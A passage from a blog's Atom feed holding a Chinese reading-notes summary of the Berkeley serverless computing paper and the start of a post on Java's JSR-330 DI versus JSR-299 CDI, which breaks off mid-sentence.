&lt;p&gt;&lt;img src=&quot;/img/Quarkus学习（一）概述以及编写REST服务/55c78ef5546cbae1f7b88dc2241019c7.jpeg&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="Quarkus" scheme="https://lzwgiter.github.io/tags/Quarkus/"/>
    
  </entry>
  
  <entry>
    <title>Cloud Programming Simplified:A Berkeley View on Serverless Computing</title>
    <link href="https://lzwgiter.github.io/posts/e88577c0.html"/>
    <id>https://lzwgiter.github.io/posts/e88577c0.html</id>
    <published>2021-08-19T02:39:40.000Z</published>
    <updated>2021-08-31T01:06:08.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这篇论文深入探讨了ServerlessComputing这个较新的云计算概念，并讨论了它的来源、想要解决的问题等等。最近也是接触了一些新的云技术的思想和技术，尤其是自接触了Kubernetes和Quarkus，触发了我对这个领域的好奇心。云计算领域之前也有写过文章<ahref="https://float311.gitee.io/posts/662e1cfe.html">微服务入门-5W和微服务思想· float'sblog</a>，但是当时只是简单的看了一下供微服务应用底层使用的一些平台，比如IaaS、PaaS，FaaS等等，也只简单了解了Serverless的概念。故跟着学习一下。</p></blockquote><span id="more"></span><h1 id="摘要">摘要</h1><p>文章摘要主要叙述了以下重点内容：</p><ul><li>说明Serverless cloud computing的特点和作用：<ul><li>让编程人员更容易的使用云资源</li><li>提供了一种接口，极大的简化了云原生(<code>cloud programming</code>)编程以及代表了从汇编语言向高级编程语言转化的过程</li></ul></li><li>概述了云计算的历史，包括：<ul><li>回顾2009年UCB的云计算的文章：《Above the clouds: A Berkeley view ofcloud computing. Technical report》</li><li>阐述Serverless computing的动机</li><li>概述能够解决当前serverless技术局限性的应用</li><li>列出当前该技术的难题，以及探讨其背后学术研究的机会</li></ul></li><li>结语：</li></ul><blockquote><blockquote><p>Just as the 2009 paper identified challenges for the cloud andpredicted they would be addressed and that cloud use would accelerate,we predict these issues are solvable and that serverless computing willgrow to dominate the future of cloud computing.</p></blockquote><p>就如2009年的文章指出云计算的难点、预测他们会被解决并提出云技术会繁荣昌盛一样，我们预测当前serverlesscomputing出现的问题也会被解决，并且会主导今后的云计算未来。</p></blockquote><h1 id="第一章-serverless-computing介绍">第一章 ServerlessComputing介绍</h1><p>在2009年伯克利的文章《Above the clouds: A Berkeley view of cloudcomputing. Technicalreport》中，文章叙述了六个云计算的潜在可被挖掘的优点：</p><ul><li>可以按需提供无限的计算资源</li><li>消除对云用户的预先承诺<code>the elimination of an up-front commitment by cloud users</code>（<strong>没看懂什么意思</strong>）</li><li>可以提供短期内交付所需计算资源的能力</li><li>由于使用了<strong>很多、很大</strong>的数据中心，所以提供了显著降低了成本的规模经济<code>Economies of scale</code></li><li>通过资源虚拟化来简化操作流程并提高了资源利用率</li><li>通过复用来自不通组织的工作负载来提高硬件利用率</li></ul><p>但是2009年提出的这些优势，在这十年间(到2019年)上述的六个优势的最后两个没有实现，即：云用户的操作依旧很复杂、多个工作负载也没有从高效的多路复用中获取收益。这两个问题具体展开来说问题如下：</p><ul><li>云计算让用户避免了直接管理物理基础设施，<strong>但是用户仍需要去管理大量的虚拟资源</strong>。</li><li>多路复用在批类型的工作负载中(比如Hadoop的MapReduce或者高性能计算)表现的很好，这些类型都可以充分利用他们分配的实例。但是对于一些有状态的服务，比如数据库管理系统，移植到云上则会影响工作效果。(原因是因为数据库通常上需要长期保留实例，然而他们的工作负载可能是突发性的，这会导致较低的资源利用率)</li></ul><p>2009年的时候，在云计算虚拟化领域主要有两个解决方案：</p><ul><li>Amazon EC2</li><li>Google App Engine</li></ul><p>前者(EC2)属于更偏底层的方案，实际上市场也选择了Amazon的EC2，但是缺点随之而来，那就是开发人员得自己管理虚拟机，基本包括就是作为系统管理员或者跟系统管理员一块设置开发环境，下面列出了在云上直接操作环境，你自己要考虑的事情：</p><ol type="1"><li>你得保证可用性，避免一个机器宕机导致服务不可用</li><li>对副本进行地理隔离，避免灾害来了一锅端</li><li>为了合理利用资源，你需要考虑负载均衡以及路由</li><li>要能根据变化来自动伸缩(<strong>Autoscaling</strong>)系统</li><li>要有后台监控来保证服务一直运行</li><li>要有日志记录来为后期提供调试(debug)和性能调优</li><li>定期系统升级，包括安全补丁</li><li>如果有新的实例可用，要提供可以直接迁移的能力</li></ol><p><strong>所以，上述这些要求的步骤或者叫能力，所需要的时间精力相比于你正儿八经去实现业务功能要复杂，自然是划不来的了。</strong></p><p>基于上述这些问题，Amazon在2015年也退出了一个叫AWS Lambdaservice的服务，Lambda提供了<code>cloud functions</code>的功能，并引发了大家对于<code>serverless computing</code>的关注，这个技术带来了一大特性：<strong>用户只需要编写代码就可以了，剩下的服务器配置以及管理任务留给云提供商就可以了。</strong>所以就诞生了FaaS这种东西(Functionas a Service)，FaaS的概念<ahref="https://float311.gitee.io/微服务入门-5W和微服务思想/#FaaS">我前面有总结</a>。此外除了FaaS平台，云平台商业提供了一些定制化serverless框架，比如BaaS（Backendas a Service）。文章对<em>Serverless Computing</em>下的简单定义为：</p><blockquote><p><em>serverless-computing = FaaS + BaaS</em></p></blockquote><p>具体来说：一个服务如果是Serverless的，那么他必须可以在无显式配置的情况下可以实现autoscaling，并且根据使用情况来进行收费。</p><p>最后小结：本文会像之前2009年文章一样，对云计算领域进行讨论，列举出挑战以及学术研究价值。</p><blockquote><p>While we are unsure which solutions will win, we believe all issueswill all be addressed eventually, thereby enabling serverless computingto become the face of cloud computing.</p></blockquote><p>文章预测serverless技术会成为云计算领域技术的代表(face啊)。</p><h1 id="第二章-serverless-computing技术的出现">第二章 ServerlessComputing技术的出现</h1><p>在Serverless平台下，用户只需要用高级编程语言实现业务逻辑就可以了，其他的如实例选举、扩容、部署、容错、监控、日志记录、安全补丁等等操作都交由serverless系统平台自己处理。</p><p>下表表示传统方案和Serverless方案的区别，文章将传统方案称为<strong><em>serverfulcloudcomputing</em></strong>(后续我也直接这么写，代表传统方案)。这两种方案代表基于函数的/以服务器为中心的计算平台的端点(endpoint)，而如Kubernetes这样的容器编排框架则代表中间体。</p><figure><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-20210819180804653.png"alt="image-20210819180804653" /><figcaption aria-hidden="true">image-20210819180804653</figcaption></figure><p>从上表我们可以看出，不仅整体的成本下来了，而且原本SysAdmin的工作也全都交由云提供商来完成了，我们只需要敲就完事了。</p><p>下图展示了serverless架构是如何简化了应用部署、让云资源变得更加好用的：</p><figure><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-20210819181110837.png"alt="image-20210819181110837" /><figcaption aria-hidden="true">image-20210819181110837</figcaption></figure><p>作者接下来用一个小例子说明了云计算的过程，并指出了serverless的优点：</p><blockquote><p>在云计算下，serverfulcomputing是在一个使用如汇编语言等底层语言来进行实现的，而serverlesscomputing则使用高级编程语言，比如Python。</p><p>举一个例子比如c = a+b，如果是汇编语言的话，首先需要选择多个可以使用的寄存器，然后保存a和b，然后进行数学运算，然后将结果c再另存到寄存器中。这个过程就映射了serverfulcloudprogramming的过程。首先你要准备提供可用的资源或者指出可用的资源，然后将这些资源加载、进行运算、返回或储存这个结果，最后释放资源。</p><p>然而，对于serverlesscomputing，它的目的和应用场景是带给云编程人员上类似述的过度到高级编程语言的一些优势，此外，高级编程语言和serverlesscomputing也有相似之处。就好比自动化的内存管理使得程序员不必自己去管理内存资源一样，serverlesscomputing也使得我们不必去管理服务器资源。</p></blockquote><p>具体来讲，serverless computing和serverful computing有三大区别：</p><ol type="1"><li>将计算和存储解耦(Decoupled)。存储和计算两部分是分开进行伸缩的，并且是分开提供和计费的。即储存服务是由一个单独云服务商提供的，并且计算服务是无状态的。</li><li>在无需管理资源分配的情况下执行代码。写好代码直接扔上去，云平台就会自动分配资源并执行代码。</li><li>在支付(Paying，也就是计费)的时候，不是按照资源分配量来支付而是按照资源使用量来支付(这一点前面也说过了)。平台是按照和运行相关的元素来进行计费的，比如运行的时间，而不是说按照分配好的资源量来计费的，比如给你分的虚拟机数目之类的。通俗点，一个包子一块，你买了3个吃了2个包子就掏2块，不是掏3块。</li></ol><p>下面在上述这三个区别的基础上进行详细讨论</p><h2 id="serverless-computing的上下文讨论定义特征">ServerlessComputing的上下文(讨论定义、特征)</h2><p>让serverlesscomputing实现需要哪些技术呢？作者提及以前也有类似的技术，比如PaaS平台(如Heroku、Firebase等)、CGI技术(Perl，PHP)等等，但是作者认为serverlesscomputing相对于这些传统模型，Serverless Comp带来了更大的创新。</p><p>哪些创新？serverlesscomputing相比之前的这些模型带来了：更好的自动伸缩、较好的隔离机制、平台灵活性和服务生态支持。</p><p>文章举了AWSLambda为例子，说明了Lambda在收缩机制上的进步，并且按照<code>the time thire code was actually executing, not for the resources reserved to execute their program</code>的标准来收取费用。</p><p>ServerlessComputing依赖于强大的性能和安全的隔离机制来让多用户同享硬件，目前的标准是使用类似VM虚拟机的隔离机制，当然VM虚拟机的创建肯跟会花费一定时间，所以serverless的提供商们在尽力用技术来加速开发环境的创建。文章举的还是Lambda的例子，Lambda中有两个缓冲池，一个叫做<code>warm pool</code>，由一些VM实例组成，可以理解为预热池，直接按需分配给用户而无需再去创建；还有一些VM实例组成了<code>active pool</code>，这些实例正在运行且被一直维护来供未来使用。<strong>所以，使用资源生命周期管理以及多用户打包来实现高利用率，对serverlesscomputing来说是重要的技术点</strong>，文章指出近期一些厂商在通过容器技术、<em>unikernel</em>、libraryOSes，或者<em>languageVMs</em>来降低多用户隔离的开销，比如Google的gVisor，已被<em>AppEnging</em>、<em>Cloud Functions</em>、Cloud MLEngine采用；Amazon的<em>Firecracker</em>虚拟机已被<em>AWSLambda</em>和<em>Fargate</em>采用；<em>CloudFlareWorkers</em>的serverless平台则采用了Web浏览器沙盒技术，在一些使用JavaScript实现的云功能之间进行用户隔离。</p><p>serverless computing还有一些其他的优势：</p><ul><li>允许用户使用自己的库(libraries)，所以较PaaS平台支持更广应用面的应用程序。而<strong>PaaS服务则和具体的应用捆绑在一起</strong>。</li><li>FaaS使得serverless流行的原因还有一点：背后的BaaS提供了其他的基础性功能，而这些基础性功能从公有云出现的时候(比如AWSS3)就存在了。所以BaaS的存在也是一个优势。</li></ul><p><strong>这里作者也澄清了一个概念，FaaS和Serverlesscomputing不是一个东西，前文如果你有和我一样的疑惑，这里就解开了</strong></p><blockquote><p>Cloud functions(i.e., FaaS) represent serverless computing in a moregenerel form.</p></blockquote><p>即FaaS它知识ServerlessComputing的一个更为具体的形式，即规范和实现这种关系。下表对比了一些serverlesscomputing服务在编程接口和消费模型上的区别，我们可以看到不同应用他的接口以及模型都是消费方式都是不一样的，<strong>个人认为这旨在说明了ServerlessComputing服务的应用领域的多样性。</strong></p><figure><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-20210819201741247.png"alt="image-20210819201741247" /><figcaption aria-hidden="true">image-20210819201741247</figcaption></figure><p><strong>要注意一点就是，这些应用的存储费用是要单独来收取的，比如GoogleCloud Storage、AWS S3等。</strong></p><p>接下来作者围绕一些新兴技术结合着进行了讨论，包括Kubernetes技术、边缘计算技术。</p><p>首先是关于Kubernetes的，要讨论一个问题：</p><blockquote><blockquote><p>how it relates to Kubernetes？</p></blockquote><p>这和Kubernetes有啥关系吗？</p></blockquote><p>首先是什么是Kubernets的定义？</p><blockquote><blockquote><p>a "container orchestration" technology for deployingmicroservices</p></blockquote><p>一个用来部署微服务的容器编排技术</p></blockquote><p>所以结论是，不同于<em>ServerlessComputing</em>，<em>Kubernetes</em>它是一个可以简化<em>serverfulComputing</em>的技术。下面是他们的相似点与不同点：</p><ul><li><em>Kubernetes</em>也可以提供短期(short-lived)的运行环境，但在硬件资源、运行时间和网络通信这些方面上限制小得多。</li><li><em>Kubernetes</em>可以直接将你自己本地开发的应用程序直接部署到公有云上，并且几乎没啥修改。而ServerlessComputing则引入了一种范式转变(paradigmshift)，将操作责任完全交给了提供者，并让细颗粒度的多用户多路复用成为可能。GoogleKubernetes Engine(GKE)以及AWS Elastic KubernetesService(EKS)都提供了一个中庸的选择：既减轻了Kuberenetes的运行管理，也给予了开发者能够配置任意容器的灵活性</li><li><em>Kubernetes</em>和<em>ServerlessComputing</em>的收费方式也不一样，前者是按照拥有的资源来收费，而后者是按照每个功能的运行时间来收费</li></ul><p>作者接下来也阐述了一个<strong>预测</strong>，Kubernetes不仅可以本地运行应用，它也同样使用于混合型的应用程序，比如一部分运行在本地，另一部分运行在云上。作者认为这种混合型的应用对于<strong>逐步迁移到云</strong>这一过程是有意义的。但是长远来看，作者认为云计算规模的逐渐扩大、更快速的网络、不断增加的云服务、通过ServerlessComputing技术而逐渐简化的云资源管理，这样的混合型应用的存在感会慢慢减小。</p><p>紧接着作者讨论了边缘计算方面。</p><blockquote><blockquote><p>Edge computing is the partner of cloud computing in the PostPCEra.</p></blockquote><p>边缘计算是后PC时代、云计算的合作伙伴</p></blockquote><p>这里作者主要讨论ServerlessComputing将如何改变数据中心内的变成，这对边缘计算也有有趣的潜在影响。一些内容交付网络(CDN)运营商提供了在靠近用户在基础设施中执行一个Serverless函数的功能，甚至<em>AWSIoT Greengrass</em>还可以吧这些函数嵌入到边缘设备中。</p><h2 id="serverless-computing的优势">Serverless Computing的优势</h2><blockquote><p>本章主要说明了一些ServerlessComputing的优势，带来的好处，并陈述了一些表明ServerlessComputing在不断增长的数据报告，这块我就不写具体数据了。</p></blockquote><ul><li><p>对于云提供商来说ServerlessCOmputing技术可以促进业务增长，因为这使得云资源更容易吸引新的用户以及让旧用户发现更多可探索的功能。</p></li><li><p>由于ServerlessComputing运行时间短、内存占用小、无状态的特性，云提供商可以用一些未使用的资源来运行这些任务，比如一些没那么流行的、普通的计算机资源，这些资源可能对于传统Serverful的用户来说没啥用，但是可以投入到Serverless使用中去。</p></li><li><p>对于客户来说，Serverless允许使用高级编程语言，提高了客户的生产效率，并且还可以节省成本。</p></li><li><p>Serverless也让云部署的级别从x86机器码提升到了高级编程语言，带来了架构的创新。比如，如果ARM或者RISC-V能带来比x86更高的效率的话，Serverless平台可以轻松地切换指令集。</p></li><li><p>对新手非常友好。即使是菜鸡也能在不了解云基础设施的情况下轻松地部署函数功能，大神们也可以节省开发时间来专注于业务本身。</p></li><li><p>研究人员被ServerlessComputing所吸引，因为它有望成为云计算的未来，有更多的机会来提升当前的性能并客服当前的局限性。</p></li></ul><h1 id="第三章-serverless-computing平台当前的局限性">第三章 ServerlessComputing平台当前的局限性</h1><blockquote><p>本节作者举了五个研究项目的例子来讨论阻碍了ServerlessComputing技术的一些难题。包括：</p><ul><li>ExCamera: Video encoding in real-time</li><li>MapReduce</li><li>Numpywren: Linear algebra</li><li>Cirrus: Machine learning training</li><li>Serverless SQLite: Databases</li></ul></blockquote><p>下面是这五个项目的总结，包括功能性描述、挑战、工作环境、表现。接下来会对表里出现的问题进行讨论。</p><p><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-123.png" /></p><h2 id="细颗粒度操作的储存不够">细颗粒度操作的储存不够</h2><blockquote><p>serverless平台天生就是无状态的，所以这导致很难去支持一些需求是细颗粒度状态共享的应用。<strong>而这最大的原因，就是因为现存的、云服务商提供的存储服务的局限性。</strong></p></blockquote><p>哪些局限性？下表进行了说明：</p><p><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-123231.jpg" /></p><p>上表中绿色就是好，橙色就是罢了，红色就是不大行。最后一列是我们想要的--<code>Ideal</code></p><p>包括了Block Storage类型、对象型数据库(AWS S3、Azure BlobStorage、Google Cloud Storage)、文件系统、键值型数据库(AWSDynamoDB、Google Cloud Datastore、Azure CosmosDB)。但是上述这些应用都有各自的优缺点。</p><p><strong>学术研究价值：由于不同的应用程序需要不同的持久性和可用性保证，所以作者认为这需要我们去开发一些临时的和持久的Serverless存储方案</strong>，第四章会详细讨论。</p><h2 id="缺乏精细的协同coordination">缺乏精细的协同(coordination)</h2><blockquote><p>为了扩展Serverless Computing的能力来支持状态化的应用(statefulapplications)，serverless框架需要提供一种可以用来<strong>协同</strong>的方式。好比taskA用了taskB的输出，那么A必须要有一种方式能知道B是否产生了输出，即使这俩不在一个节点上。许多旨在确保数据一致性(<code>data consistency</code>)的协议也需要类似的<strong>协同</strong>。</p></blockquote><p>这里作者想说的协同我个人理解就是通信的方式，目前没有一个云存储服务提供了通知功能(<code>notification capabilities</code>)。虽然云提供商业提供了<strong>独立的通知服务</strong>，比如SNS、SQS，但是它们都带来了较大的延迟，有时候甚至几百毫秒。而且对于细颗粒度的协同来说花费太大。</p><p>虽然也有一些论文提出了新的系统比如Pocket -- Pocket: Elastic ephemeralstorage for serverless analytics. <em>In 13th USENIX Systemposium onOperating Systems Design and Implementation</em>(OSDI 18), pages472-444, 2018，但是该方案也尚未被云提供商锁才去。</p><p>所以，对于开发者来说，他们的程序就么得选择了，就只能要么用虚拟机来提供比如ElastiCache或者SAND这样的通知服务，或者他们自己实现一套通信机制。</p><p><strong>学术研究价值：新的ServerlessComputing还值得被挖掘和探索，比如对函数实例进行命名，以实现直接寻址访问其内部状态(比如Actorsas a Server, 来自：Johnn Schleier-Smith. Serverless foundations forelastic database systems. CIDR, 2019)。</strong></p><h2 id="标准通信模式下性能较差">标准通信模式下性能较差</h2><p><code>broadcast-广播</code>，<code>aggregation-聚合</code>，<code>shuffle-重新分发数据</code>这些都是常见的分布式系统的通信原语，一把都是由应用来执行，比如说在机器学习训练过程中或者大数据分析过程中。下标展示了基于VM虚拟机或者基于函数的方案使用这些原语所构成的通信方式：</p><p><imgsrc="/img/Cloud-Programming-Simplified-A-Berkeley-View-on-Serverless-Computing/image-f43792384.jpg" /></p><p>从图中可以看到a中的VM通信方式所需的远程消息数目明显少于b，这是因为VM实例支持在发送数据之前或者之后，可以夸人物在本地进行共享、聚合、组合。</p><p>对于VM方案，所有在同一个实例上运行的任务都可以获取被广播的数据的副本，或者在给其他实例发送数据前先进行本地的聚合。所以对于VM方案，广播和聚合的通信复杂度是<em>O(N)</em>，N代表系统中VM的实例数目。</p><p><strong>学术价值：然而，对于基于函数的方案，这个复杂度是<em>O(N xK)</em>，其中K代表每一个VM的函数的数目</strong>。对于Shuffle操作来说这个差别更大了，假如说同样数目的发送这和接受者产生了N^2个消息数目，对于b方案来说，就需要发送<strong><em>(Nx K)^2</em></strong>个数目的消息，K通常上范围是[10,100]。这都是理想的状态，由于应用程序不能控制云功能的位置，有可能一个ServerlessComputing应用就得发送比这个多2到个数量级的数据。</p><h2 id="不可预测的表现">不可预测的表现</h2><p>尽管云函数比传统的基于VM虚拟机的实例启动延迟要小的多，但是对于一些应用，云函数的方式可能会导致他的启动延迟变大。有三个影响这个冷启动延迟的因素：</p><ul><li>启动云函数的时间</li><li>初始化这个函数所需要软件环境的时间，比如加载Python库</li><li>具体应用中用户代码的初始化时间</li></ul><p>虽然说可能一个云函数启动花费时间小于一秒，但是如果云函数的数目多了，这个时间就会变成几十秒。<strong>这是一个值得研究的学术问题。</strong></p><p><strong>此外另一个值得研究的问题就是</strong>，由于云提供商提供选择的底层服务器种类多样，所以导致很难去预测硬件资源的性能，比如不同世代的CPU，<strong>这种不确定性暴露了云提供商希望最大限度利用他们的资源的愿望和 可预测性之间的取舍问题。</strong></p><h1 id="第四章-serverless-computing的未来">第四章 ServerlessComputing的未来</h1><blockquote><p>这一章作者主要说研究人员已经开始着手解决上一章节提到的问题了，包括伯克利的人也在寻找以数据为中心的分布式系统、机器学习和编程模型的挑战以及ServerlessComputing的机遇。下面小结将以一个广泛的视角来讨论一些能够良好结合ServerlessComputing的应用和硬件的例子，<strong>并指明学术界的挑战，主要包括五个方面：抽象、系统、网络、安全性、架构</strong></p></blockquote><h2 id="抽象挑战">抽象挑战</h2><h3 id="资源需求">资源需求</h3><h3 id="数据依赖">数据依赖</h3><h2 id="系统挑战">系统挑战</h2><h3id="高性能的经济实惠透明工作的存储服务">高性能的、经济实惠、透明工作的存储服务</h3><h4 id="ephemeral-storage临时性存储">Ephemeral Storage(临时性存储)</h4><h4 id="durable-storage永久性存储">Durable Storage(永久性存储)</h4><h3 id="协同信号机制signaling服务">协同/信号机制(signaling)服务</h3><h3 id="最小化启动时间">最小化启动时间</h3><h2 id="网络挑战">网络挑战</h2><h2 id="安全挑战">安全挑战</h2><h3 id="调度随机化和物理隔离">调度随机化和物理隔离</h3><h3 id="细颗粒度的安全上下文管理">细颗粒度的安全上下文管理</h3><h3 id="oblivious遗忘的-serverless-computing">Oblivious(遗忘的)Serverless Computing</h3><h2 id="计算机架构挑战">计算机架构挑战</h2><h3 id="硬件异构性定价和管理便利性">硬件异构性、定价和管理便利性</h3><h2 id="参考学习">参考学习</h2><p>Jonas E , Schleier-Smith J , Sreekanti V , et al. Cloud ProgrammingSimplified: A Berkeley View on Serverless Computing[J]. 2019.</p><p><ahref="https://blog.csdn.net/wufeifan_learner/article/details/109901263">(72条消息)论文阅读笔记（五）：Cloud Programming Simplified: A Berkeley View onServerless Computing_wufeifan_learner的博客-CSDN博客</a></p><p><ahref="https://blog.csdn.net/qq_21125183/article/details/94442852">(72条消息)Cloud Programming Simplifie : A Berkeley View on ServerlessComputing_Master-TJ的个人博客-CSDN博客</a></p><p><a href="https://developer.aliyun.com/article/713966">阿里毕玄：《ABerkeley View on Serverless Computing》读后感-阿里云开发者社区(aliyun.com)</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom: 50%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这篇论文深入探讨了Serverless
Computing这个较新的云计算概念，并讨论了它的来源、想要解决的问题等等。最近也是接触了一些新的云技术的思想和技术，尤其是自接触了Kubernetes和Quarkus，触发了我对这个领域的好奇心。云计算领域之前也有写过文章&lt;a
href=&quot;https://float311.gitee.io/posts/662e1cfe.html&quot;&gt;微服务入门-5W和微服务思想
· float&#39;s
blog&lt;/a&gt;，但是当时只是简单的看了一下供微服务应用底层使用的一些平台，比如IaaS、PaaS，FaaS等等，也只简单了解了Serverless的概念。故跟着学习一下。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    
    <category term="论文阅读" scheme="https://lzwgiter.github.io/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    
    <category term="云技术" scheme="https://lzwgiter.github.io/tags/%E4%BA%91%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>闲聊一下Java中的DI和CDI</title>
    <link href="https://lzwgiter.github.io/posts/99665dc1.html"/>
    <id>https://lzwgiter.github.io/posts/99665dc1.html</id>
    <published>2021-08-18T08:11:16.000Z</published>
    <updated>2021-08-25T11:24:22.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>emm，更具体地来说其实是闲聊JSR-299与JSR-330，以及进一步澄清Spring的DI和Quarkus的CDI的概念。能疑惑这个问题只能说明我对Java的历史不够了解啊，只是很肤浅的去使用而没有思考其来源。</p><p>思考这个问题是因为我接触了Quarkus这个Java框架，大家一说到区块链一说到容器化可能都会去想go，而不是资源占有大且重量级的Java，这个框架就是用来解决Spring系列在这方面繁重的问题的，具体我会在Quarkus系列中详细叙述该框架的优点。</p><p>今天这篇文章主要内容包括这些：</p><ul><li>澄清一下DI(<em>Dependency Injection</em>)和CDI(<em>Context andDependencyInjection</em>)的关系与区别，顺带记录一下我自己思考的过程；</li><li>澄清一下记Spring的ioc机制和这二者的关系(其实这俩没关系。。)</li><li>简言一下Quarkus的特点</li></ul></blockquote><span id="more"></span><h1 id="我在疑惑什么">我在疑惑什么？</h1><p>我为什么闲了发现这个问题呢？大家平常都用IDEA写代码，IDEA为我们提供了大量的、巨好用的插件，你好比说你的项目是Spring-Boot的，你可能会看到这样的组件：</p><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821170658738.png"alt="image-20210821170658738" /><figcaption aria-hidden="true">image-20210821170658738</figcaption></figure><p>组件中我们可以清晰的看到我们定义的<code>bean</code>。</p><p>而如果在Quarkus项目中，他是这个样子的：</p><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821171622638.png"alt="image-20210821171622638" /><figcaption aria-hidden="true">image-20210821171622638</figcaption></figure><p>然后我就好奇了，CDI？CDI是啥意思？我初步的猜测是以为：<del>Spring和Quarkus都对ioc这个理论进行了实现，在Quarkus中叫CDI。</del></p><p>然后我一查，我发现憨憨就是我了。</p><h2 id="cdi和di的关系和区别">CDI和DI的关系和区别?</h2><p>CDI的全称叫<em>Context and DependencyInjection</em>，即上下文与依赖注入，DI的全程叫<em>DependencyInjection</em>。</p><p>ok，多了个Context，有啥大区别啊？然后我就可劲的翻百度，国内貌似没有人像我一样问这个憨憨的问题，ok翻谷歌，哎就翻出来了。</p><p>首先要知道什么是JSR，JSR全称是<em>Java SpecificationRequest</em>，是不是有点RFC那味了？差不多其实，JSR大家都可以提交，都可以提出一个自己构思的没有出现过的Java新特性，然后交由JCP(<em>JavaCommunityProcess</em>)来进行审核，最终如果通过了审核，那么就会被加入新的Java版本中作为新特性，JCP的职责如下：</p><blockquote><p>The Java Community Process (JCP) Program is the process by which theinternational Java community standardizes and ratifies thespecifications for Java technologies.</p></blockquote><p>而我们的CDI和DI，恰恰就是在Java EE6中的新特性，二者分别定义域JSR299以及JSR 330：</p><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821172543081.png"alt="image-20210821172543081" /><figcaption aria-hidden="true">image-20210821172543081</figcaption></figure><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821172554156.png"alt="image-20210821172554156" /><figcaption aria-hidden="true">image-20210821172554156</figcaption></figure><p>按照时间线，最早提出的其实是DI，该提案由Bob Lee和RodJohnson在2015年1月9号提出，实现了ioc这一核心概念，如果你想要了解ioc，可以参考我之前的文章：<ahref="https://float311.gitee.io/JavaEE基础-Spring学习%20-%20IOC机制/#IOC">JavaEE基础-Spring学习- IOC机制 · float's blog (gitee.io)</a>。</p><p><strong>而这些新的特性，都被包含在了<code>javax.inject</code>这个包中</strong>:</p><p><img src="/img/闲聊一下Java中的DI和CDI/image-20210821173003704.png" alt="image-20210821173003704" style="zoom:80%;" /></p><p>我们可以看一下这个包都包含了什么：</p><figure><img src="/img/闲聊一下Java中的DI和CDI/image-20210821173022697.png"alt="image-20210821173022697" /><figcaption aria-hidden="true">image-20210821173022697</figcaption></figure><p>嗷，一共有六个注解，我把他们的定义列一个表看看，英文是源代码注释，中文是我自己补充的</p><table><colgroup><col style="width: 14%" /><col style="width: 85%" /></colgroup><thead><tr class="header"><th>注解名称</th><th>定义</th></tr></thead><tbody><tr class="odd"><td><span class="citation" data-cites="Inject">@Inject</span></td><td>Identifies injectable constructors, methods, and fields. May applyto static as well as instance members. An injectable member may have anyaccess modifier (private, package-private, protected, public).</td></tr><tr class="even"><td><span class="citation" data-cites="Named">@Named</span></td><td>给被@Inject指定的bean设定名称，比如@Inject <span class="citation"data-cites="Named">@Named</span>('driver') Seat driverSet;</td></tr><tr class="odd"><td><span class="citation" data-cites="Provider">@Provider</span></td><td>Provides instances of T. Typically implemented by an injector. Forany type T that can be injected, you can also inject Provider<T>.类似一个工厂，使用这个注解而不是@Inject可以带来一些特性(比如懒加载、多例、对实例的来源范围进行抽象、打破循环依赖)</td></tr><tr class="even"><td><span class="citation" data-cites="Qualifier">@Qualifier</span></td><td>Identifies qualifier annotations. Anyone can define a newqualifier.</td></tr><tr class="odd"><td><span class="citation" data-cites="Scope">@Scope</span></td><td>Identifies scope annotations. A scope annotation applies to a classcontaining an injectable constructor and governs how the injector reusesinstances of the type. By default, if no scope annotation is present,the injector creates an instance (by injecting the type's constructor),uses the instance for one injection, and then forgets it. If a scopeannotation is present, the injector may retain the instance for possiblereuse in a later injection.你可以用这玩意儿定义自己的<strong>范围注解</strong>，比如典型的注解@Singleton就组合了<spanclass="citation" data-cites="Scope">@Scope</span></td></tr><tr class="even"><td><span class="citation" data-cites="Singleton">@Singleton</span></td><td>Identifies a type that the injector only instantiates once. Notinherited.</td></tr></tbody></table><p>当我看到这六个注解的时候，我的第一反应：<strong>这咋和Spring的@Autowired、<spanclass="citation"data-cites="Bean之类的那么像呢">@Bean之类的那么像呢</span>？</strong>我们把这个问题放到下一章讨论。</p><p>ok，DI我懂了，由JSR 330提出，就是上面那六个注解，那CDI是啥？不都有JSR330了么？要JSR 299干啥？</p><p>其实我这么说你想想，上面这几个注解是不是可以帮你很好的注入JavaBean吧？那问题来了，这些JavaBean所存在的上下文(Context)你怎么获取呢？</p><p>我们把视野放到今天，具体点，Spring中的<code>ApplicationContext</code>(org.springframework.context.ApplicationContext)，可以用来从xml格式的bean配置文档中获取bean，你JSR330可以吗？Spring中支持AOP切面编程，你JSR 330可以吗？所以你可以看到，JSR330虽然开辟了一个新世界，但是也仅仅是开辟，属于很简单的ioc。</p><p>所以Gavin King提出了JSR 299。<strong>它对JSR 330进行了加强，以JSR330作为基础，增加了大量的特性，显著地增加了对模块化(modularzation)、切面编程(crosscutting aspects)、自定义范围(custom scopes)、类型安全的注入(type safeinjection)的支持。</strong></p><p>有人对JSR 299和JSR 330的区别是这么解释的：</p><blockquote><p>The relation between JSR-299 and JSR-330 is comparable to therelation between JPA and JDBC. JPA uses internally JDBC, but you canstill use JDBC without JPA. In Java EE 6 you can just use JSR-330 forbasic stuff, and enhance it on demand with JSR-299. There is 